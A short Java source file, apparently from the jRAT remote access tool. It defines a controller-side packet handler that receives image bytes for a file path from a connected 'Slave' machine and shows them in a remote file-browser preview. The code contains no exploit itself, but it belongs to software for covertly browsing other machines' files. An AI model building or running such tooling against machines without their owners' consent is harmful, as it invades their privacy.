package jrat.module.fs.packets;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;
import jrat.module.fs.ui.previews.PanelPreviewImage;

import java.awt.image.BufferedImage;

public class Packet43PreviewImage implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
	    String path = slave.readLine();
		int imageSize = slave.readInt();

		byte[] buffer = new byte[imageSize];
		slave.readFully(buffer);

		FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);

		if (panel != null) {
		    PanelPreviewImage preview = (PanelPreviewImage) panel.getPreviewHandler(path);

		    if (preview != null) {
                BufferedImage image = ImageUtils.decodeImage(buffer);

                preview.addData(image);
            }
		}
	}
}
